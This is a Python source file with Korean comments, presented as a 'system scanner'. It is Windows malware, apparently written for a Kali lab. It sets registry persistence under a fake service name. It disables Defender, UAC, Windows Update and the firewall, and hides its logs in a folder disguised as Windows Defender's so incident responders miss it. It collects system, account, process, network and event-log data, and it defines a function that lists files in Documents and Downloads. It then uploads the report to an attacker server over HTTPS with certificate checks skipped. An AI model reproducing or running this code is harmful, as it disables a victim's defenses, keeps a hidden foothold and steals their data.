import os
import subprocess
import platform
import datetime
import winreg
import ctypes
import sys
import urllib.request
import urllib.parse
import ssl 

# =========================================================================
# 시스템 스캐너 및 로컬 로그 저장 (HTTPS 443 데이터 전송 포함)
# 기능: 1. 스텔스 경로 로그 저장 2. 레지스트리 영속성 설정
# 주의: 서버 IP는 반드시 사용자 환경에 맞게 변경해야 합니다.
# =========================================================================

# -------------------------------------------------------------------------
# 1. 전송 및 경로 설정
# -------------------------------------------------------------------------

# ★★★★★ 이 부분을 사용자님의 Kali Linux 서버 정보로 변경하세요. ★★★★★
SERVER_IP = "192.168.88.150"  # 예: "192.168.1.100"
SERVER_PORT = 443                   # HTTPS 기본 포트
# ★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★

def get_stealth_log_path():
    r"""
    침해대응팀이 찾기 어려운 AppData\Roaming 경로에 로그 파일을 생성합니다.
    경로 예시: C:\Users\User\AppData\Roaming\Microsoft\Windows Defender\Logs
    """
    try:
        # 1차 시도: os.path.expanduser('~')를 사용하여 사용자 홈 디렉토리 경로 구성
        home_path = os.path.expanduser('~')
        appdata_roaming = os.path.join(home_path, "AppData", "Roaming")
        
        # 합법적인 윈도우/MS 프로그램처럼 보이도록 경로 구성 (Windows Defender 위장)
        stealth_dir = os.path.join(appdata_roaming, "Microsoft", "Windows Defender", "Logs")
        
        # 디렉토리가 없으면 생성합니다.
        if not os.path.exists(stealth_dir):
            os.makedirs(stealth_dir, exist_ok=True)
            
        return stealth_dir
        
    except Exception as e:
        # 2차 시도: APPDATA 환경 변수를 사용하는 폴백 (원래 경로보다 안전함)
        try:
            appdata_path = os.environ.get("APPDATA")
            if appdata_path:
                 stealth_dir = os.path.join(appdata_path, "Microsoft", "Windows Defender", "Logs")
                 if not os.path.exists(stealth_dir):
                    os.makedirs(stealth_dir, exist_ok=True)
                 return stealth_dir
        except:
            pass # 2차 시도도 실패

        # 최후의 수단: 환경 변수를 사용하지 않는 임시 경로 (탐지 위험 높음)
        return os.path.join("C:\\ProgramData", "Logs", "SystemCache")


STEALTH_LOG_DIR = get_stealth_log_path()
# 파일명에 타임스탬프와 사용자 이름 포함
USER_NAME = os.environ.get('USERNAME', 'unknown')
TIME_STAMP = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
LOG_FILE_NAME = f"Scan_Report_{USER_NAME}_{TIME_STAMP}.txt"
LOG_FILE_PATH = os.path.join(STEALTH_LOG_DIR, LOG_FILE_NAME)

def registry_operations():
    """
    시스템 재부팅 시 자동 실행을 위해 레지스트리 Run 키에 영속성을 설정합니다.
    합법적인 시스템 서비스처럼 보이도록 이름을 위장합니다.
    """
    try:
        # 현재 사용자(HKCU)의 Run 키를 엽니다.
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])
        
        # 합법적인 것처럼 보이는 이름으로 값을 설정합니다.
        winreg.SetValueEx(key, "WindowsServiceHost", 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)

        # 2. 윈도우 디펜더 비활성화
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender", 0, winreg.KEY_SET_VALUE)

        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])

        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # 3. UAC 비활성화
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)

        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])

        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        
        # 6. Windows Update 비활성화
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU", 0, winreg.KEY_SET_VALUE)
        if not key:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU")

        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])

        winreg.SetValueEx(key, "NoAutoUpdate", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

        # 8. 방화벽 비활성화 (표준 프로필)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", 0, winreg.KEY_SET_VALUE)

        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])

        winreg.SetValueEx(key, "EnableFirewall", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)

        # 9. 사용자 계정 컨트롤 알림 수준 최저로 설정
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)

        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])

        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)

        # 10. 스크립트 파일 숨김 속성 부여
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)

        # PE 파일의 현재 경로를 가져옵니다. (컴파일된 PE 파일의 경로)
        app_path = os.path.abspath(sys.argv[0])

        winreg.SetValueEx(key, "Hidden", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
    except Exception as e:
        # 레지스트리 쓰기 실패 시 조용히 넘어갑니다.
        pass

# -------------------------------------------------------------------------
# 2. PowerShell 스크립트 내용 (시스템 감사 기능만 포함)
# -------------------------------------------------------------------------

POWERSHELL_SCRIPTS = {
    "System_Info": """
        Write-Output "--- [PS 시스템 정보] ---"
        systeminfo
        Write-Output "`n--- [네트워크 정보 (ipconfig)] ---"
        ipconfig /all
        Write-Output "`n--- [활성 네트워크 연결 정보 (netstat)] ---"
        netstat -ano
    """,
    "User_Process_Info": """
        Write-Output "--- [현재 사용자 및 계정 목록] ---"
        whoami
        net user
        Write-Output "`n--- [실행 중인 프로세스 목록] ---"
        Get-Process | Select-Object -Property ProcessName, Id, Path, StartTime | Format-Table -AutoSize
    """,
    "Firewall_Audit": """
        Write-Output "--- [방화벽 상태 감사] ---"
        Write-Output "*** 방화벽 프로필 상태 ***"
        Get-NetFirewallProfile | Format-Table Name, Enabled -AutoSize
        Write-Output "`n*** 활성화된 인바운드 허용 규칙 (최대 20개) ***"
        Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True | Select-Object -First 20 DisplayName, Protocol, LocalPort, RemotePort | Format-Table -AutoSize
    """,
    "Event_Log_Audit": """
        Write-Output "--- [이벤트 로그 감사: 최근 10개 항목] ---"
        $logsToAudit = "Application", "Security", "System"
        foreach ($log in $logsToAudit) {
            Write-Output "`n*** $log 이벤트 로그 (최근 10개) ***"
            Get-WinEvent -LogName $log -MaxEvents 10 | Format-List -Property TimeCreated, LevelDisplayName, ProviderName, Message
        }
    """,
    "Activity_Log_Mock": """
        Write-Output "--- [활동 로그 (Mock)] ---"
        Write-Output "이 스크립트는 시스템 감사 메시지이며, 민감한 정보 수집 기능을 포함하지 않습니다."
        Write-Output "로그 기록 시간: $(Get-Date)"
        Write-Output "사용자 환경 정보: $env:COMPUTERNAME\$env:USERNAME"
    """
}

# -------------------------------------------------------------------------
# 3. 데이터 수집 함수 (인코딩 안정화 적용)
# -------------------------------------------------------------------------

def gather_large_file_listing(log_path):
    """
    사용자 문서 폴더의 모든 파일 목록 및 용량을 재귀적으로 수집하여 로그 파일의 크기를 증가시킵니다.
    """
    try:
        # 사용자 문서 폴더를 수집 대상으로 지정합니다.
        documents_path = os.path.expanduser('~')
        # 문서 폴더, 다운로드 폴더 등 용량이 큰 곳을 위주로
        search_dirs = [
            os.path.join(documents_path, "Documents"),
            os.path.join(documents_path, "Downloads"),
        ]
        
        # 파일 목록 수집을 위한 카운터와 최대 제한 설정
        total_files_collected = 0
        MAX_FILES = 10000 # 로그 파일 크기 제한을 위해 최대 파일 개수 제한

        with open(log_path, "a", encoding="utf-8") as final_file: # Append 모드
            final_file.write("\n\n" + "="*80 + "\n")
            final_file.write(f"대용량 파일 목록 감사 시작: {datetime.datetime.now()}\n")
            final_file.write("(파일명 | 크기(Bytes) | 최종 수정 시간)\n")
            final_file.write("="*80 + "\n\n")

            for root_dir in search_dirs:
                if not os.path.isdir(root_dir):
                    continue

                for root, _, files in os.walk(root_dir):
                    if total_files_collected >= MAX_FILES:
                        break

                    for file in files:
                        if total_files_collected >= MAX_FILES:
                            break

                        file_path = os.path.join(root, file)
                        try:
                            # 파일 크기, 수정 시간 정보 수집
                            stat_info = os.stat(file_path)
                            file_size = stat_info.st_size
                            modified_time = datetime.datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                            
                            # 로그 파일에 추가
                            log_entry = f"{file_path} | {file_size} | {modified_time}\n"
                            final_file.write(log_entry)
                            total_files_collected += 1
                            
                        except Exception:
                            # 권한 오류나 기타 문제 발생 시 건너뜀
                            continue
            
            final_file.write("\n" + "="*80 + "\n")
            final_file.write(f"수집된 파일 목록 항목 수: {total_files_collected}개\n")
            final_file.write(f"대용량 파일 목록 감사 완료: {datetime.datetime.now()}\n")
            final_file.write("="*80 + "\n")

    except Exception as e:
        # 이 함수 자체의 실패는 조용히 넘어갑니다.
        pass

def gather_information():
    """CMD를 사용해 시스템 정보를 수집하고 최종 보고서 파일로 저장합니다."""
    
    cmd_commands = [
        "echo. & echo --- [PE-CMD 시스템 정보 수집] --- & echo.",
        "echo --- [시스템 정보] ---",
        "systeminfo",
        "echo.",
        "echo --- [현재 사용자 및 그룹 정보] ---",
        "whoami",
        "net user",
        "echo.",
        "echo --- [네트워크 정보] ---",
        "ipconfig /all",
        "echo.",
        "echo --- [활성 네트워크 연결 정보] ---",
        "netstat -ano",
        "echo.",
        "echo --- [실행 중인 프로세스 목록 (CMD)] ---",
        "tasklist /v"
    ]
    
    full_command = " & ".join(cmd_commands)
    
    try:
        # CMD 출력을 한국어 환경에 맞게 CP949로 캡처
        result = subprocess.run(
            ["cmd.exe", "/c", full_command], 
            capture_output=True, 
            text=True, 
            encoding='cp949', 
            check=False, 
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=30
        )
        
        # CMD 결과 로그 파일에 쓰기 (새 파일 생성)
        with open(LOG_FILE_PATH, "w", encoding="utf-8") as final_file:
            final_file.write(f"시스템 스캔 보고서 시작: {datetime.datetime.now()}\n")
            final_file.write(f"보고서 파일명: {LOG_FILE_NAME}\n")
            final_file.write(f"저장 경로: {LOG_FILE_PATH}\n")
            final_file.write("="*80 + "\n")
            final_file.write("CMD 기반 시스템 정보 수집 결과:\n")
            final_file.write("="*80 + "\n\n")
            final_file.write(result.stdout)
            
            if result.stderr:
                final_file.write(f"\n[CMD 실행 오류 메시지]\n{result.stderr}\n")

    except Exception as e:
        # 파일이 생성되지 않을 경우를 대비하여 최소한의 오류 메시지라도 남깁니다.
        try:
            with open(LOG_FILE_PATH, "w", encoding="utf-8") as final_file:
                final_file.write(f"초기 정보 수집 실패: {e}\n")
        except:
            pass # 정말 파일 쓰기가 불가능하면 아무것도 하지 않습니다.


def execute_powershell_scripts():
    """포함된 파워쉘 스크립트를 실행하고 그 결과를 최종 보고서에 저장합니다."""
    
    # LOG_FILE_PATH가 유효한지 확인하고 파일에 추가 모드로 기록합니다.
    if not os.path.exists(os.path.dirname(LOG_FILE_PATH)):
        return

    try:
        with open(LOG_FILE_PATH, "a", encoding="utf-8") as final_file: # Append 모드로 로그에 추가
            
            final_file.write("\n\n" + "="*80 + "\n")
            final_file.write(f"PowerShell 스크립트 로그 통합 시작: {datetime.datetime.now()}\n")
            final_file.write("="*80 + "\n\n")

            for title, script_content in POWERSHELL_SCRIPTS.items():
                final_file.write(f"\n--- [PowerShell Log: {title} Audit] ---\n\n")
                
                # PowerShell 스크립트 내용에 UTF-8 인코딩을 강제하는 명령어 추가
                full_ps_script = f"& {{ {script_content} }} | Out-String -Encoding UTF8"
                
                command = [
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-Command", full_ps_script
                ]

                try:
                    # PowerShell이 UTF-8로 출력하도록 강제했으므로, Python도 UTF-8 사용
                    result = subprocess.run(command, 
                                            capture_output=True, 
                                            text=True, 
                                            encoding='utf-8', 
                                            check=False, 
                                            creationflags=subprocess.CREATE_NO_WINDOW,
                                            timeout=20)
                    
                    final_file.write(result.stdout)
                    
                    if result.stderr:
                        final_file.write(f"\n[PowerShell 실행 오류 메시지]\n{result.stderr}\n")

                except Exception as e:
                    final_file.write(f"\n[스크립트 실행 실패] {title}: {e}\n")
            
            final_file.write("\n\n" + "="*80 + "\n")
            final_file.write(f"최종 보고서 작성 완료: {datetime.datetime.now()}\n")
            final_file.write("="*80 + "\n")

    except Exception as file_error:
        # 파일 쓰기 자체에 실패했을 경우 처리
        pass 


# -------------------------------------------------------------------------
# 4. 데이터 전송 함수 (HTTPS 443 Kali 서버로 전송)
# -------------------------------------------------------------------------

def send_log_to_server(file_path):
    """수집된 로그 파일을 지정된 Kali 서버로 HTTPS POST 요청을 통해 전송합니다."""
    
    if SERVER_IP == "YOUR_KALI_IP_ADDRESS" or not os.path.exists(file_path):
        # IP가 설정되지 않았거나 파일이 없으면 전송하지 않고 종료합니다.
        return

    # 전송 URL
    url = f"https://{SERVER_IP}:{SERVER_PORT}/upload"

    # 모의 환경을 위해 SSL 인증서 검증을 건너뜁니다.
    context = ssl._create_unverified_context() 

    try:
        # 로그 파일 전체 내용을 UTF-8로 읽어옴
        with open(file_path, 'r', encoding='utf-8') as f:
            log_content = f.read()

        # 데이터 필드 구성: key=value 형식으로 준비
        post_params = {
            'filename': LOG_FILE_NAME,
            'content': log_content
        }
        
        # 데이터를 URL 인코딩하고 바이트로 변환합니다.
        data = urllib.parse.urlencode(post_params).encode('utf-8')

        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        # 전송 실행 (SSL 인증서 검증 우회 컨텍스트 사용)
        with urllib.request.urlopen(req, timeout=10, context=context) as response:
            # 전송 성공 응답을 무시합니다.
            pass
            
    except Exception as e:
        # 전송 실패 시 조용히 실패 처리
        pass

# -------------------------------------------------------------------------
# 5. 메인 실행 블록
# -------------------------------------------------------------------------

def show_completion_message(log_path):
    """작업 완료 후 알림창을 띄웁니다."""
    title = "시스템 스캔 완료"
    ctypes.windll.user32.MessageBoxW(0, message, title, 64 | 0)

if __name__ == "__main__":
    if platform.system() == "Windows":
        
        # 1. 시스템 재부팅 후 자동 실행을 위한 레지스트리 영속성 설정
        registry_operations()
        
        # 경로 생성이 먼저 시도되도록 함수 호출
        STEALTH_LOG_DIR = get_stealth_log_path()
        if not os.path.exists(STEALTH_LOG_DIR):
             os.makedirs(STEALTH_LOG_DIR, exist_ok=True)

        # 2. CMD 명령으로 시스템 정보 수집 (파일 생성 및 초기화)
        gather_information()
        
        # 3. 포함된 파워쉘 스크립트 실행 및 로그 통합 (파일 추가)
        execute_powershell_scripts()

        # 4. ★★★★★ Kali 서버로 데이터 전송 (HTTPS 443) ★★★★★
        send_log_to_server(LOG_FILE_PATH)
        
        # 5. 완료 알림
        show_completion_message(LOG_FILE_PATH)
    else:
        pass